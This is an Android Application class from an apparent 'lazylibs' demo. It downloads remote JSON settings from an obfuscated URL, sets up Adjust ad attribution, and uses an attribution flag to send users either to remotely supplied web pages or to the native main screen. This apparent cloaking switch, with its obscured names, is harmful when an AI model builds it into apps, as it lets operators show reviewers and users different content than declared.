package com.lazylibs.demo;

import android.app.Activity;
import android.app.Application;
import android.content.Context;
import android.content.Intent;
import android.text.TextUtils;

import com.alibaba.fastjson.JSON;
import com.lazylibs.adsenter.Enter;
import com.lazylibs.adsenter.Patos;
import com.lazylibs.adser.Adser;
import com.lazylibs.adser.adjust.AdjustChannel;
import com.lazylibs.http.SimpleOkHttp;
import com.lazylibs.utils.Lazier;
import com.lazylibs.utils.Logger;
import com.lazylibs.utils.Xc;
import com.lazylibs.utils.cache.Cache;
import com.lazylibs.utils.cache.sp.ISpCache;
import com.lazylibs.weber.LazyWebActivity;

import java.util.concurrent.TimeUnit;

import okhttp3.OkHttpClient;

public class App extends Application {


    /***
     * 配置读取地址
     */
    private String u = Lazier.uRaw("https://i.v2o.top/sts/ads.json", Xc.ck);
    /***
     * 配置解析结果
     */
    private As appSettings = null;

    private void initAppSettings(String settings) {
        Logger.d("App.initAs()" + settings);
        if (!TextUtils.isEmpty(settings)) {
            try {
                appSettings = JSON.parseObject(settings, As.class);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }


    @Override
    public void onCreate() {
        super.onCreate();
        Lazier.onCreate(this);
        Logger.d("App.onCreate()");
        Cache.onCreate(new ISpCache.Factory() {
            @Override
            public Context requireContext() {
                return App.this;
            }
        });
        initAppSettings(Cache.get("sts", ""));
        if (appSettings != null) {
            Adser.onCreate(App.this, new AdjustChannel(appSettings.c.toSimple()));
        }
        Enter.onCreate(new Enter.ISkipper() {
            @Override
            public void adsed(Activity activity, boolean isAdser) {
                Logger.d("App.onCreate.adsed " + isAdser);
                if (appSettings != null) {
                    if (isAdser) {
                        Logger.d("App.onCreate.adsed 1 " + isAdser + appSettings.zb());
                        LazyWebActivity.start(activity.getApplicationContext(), appSettings.zb());
                    } else {
                        if (!TextUtils.isEmpty(appSettings.za())) {
                            Logger.d("App.onCreate.adsed 2 " + isAdser + appSettings.za());
                            LazyWebActivity.start(activity.getApplicationContext(), appSettings.za());
                        } else {
                            Logger.d("App.onCreate.adsed 3 " + isAdser);
                            activity.startActivity(new Intent(activity.getApplicationContext(), MainActivity.class).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
                        }
                    }
                    activity.finish();
                }
            }

            @Override
            public void showPatos(Activity activity) {
                Logger.d("App.onCreate.showPatos ");
                startActivity(new Intent(activity, Patos.class).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
                activity.finish();
            }

            @Override
            public String getPatos() {
                return appSettings != null ? appSettings.zp() : "PATOS!";//"必须同意，不同意不给玩哦";//"必须同意，不同意不给玩哦";//"https://bing.com";
            }
        });
        SimpleOkHttp simpleOkHttp = new SimpleOkHttp() {
            @Override
            public void onSuccess(String data) {
                super.onSuccess(data);
                Logger.d("App.simpleOkHttp.onSuccess" + data);
                try {
                    Cache.put("sts", data);
                    initAppSettings(data);
                    if (!Adser.isInitialized() && appSettings != null) {
                        Adser.onCreate(App.this, new AdjustChannel(appSettings.c.toSimple()));
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }

            @Override
            public OkHttpClient.Builder getHttpBuilder() {
                return super.getHttpBuilder()
                        .connectTimeout(5, TimeUnit.SECONDS)
                        .callTimeout(5, TimeUnit.SECONDS)
                        .readTimeout(5, TimeUnit.SECONDS)
                        .writeTimeout(5, TimeUnit.SECONDS);
            }
        };
        if (!TextUtils.isEmpty(u)) {
            simpleOkHttp.getRetry(u);
        }
    }

    @Override
    public void onTerminate() {
        super.onTerminate();
        Adser.onTerminate(this);
        Enter.onTerminate();
        Cache.onTerminate();
        Lazier.onTerminate();
    }
}
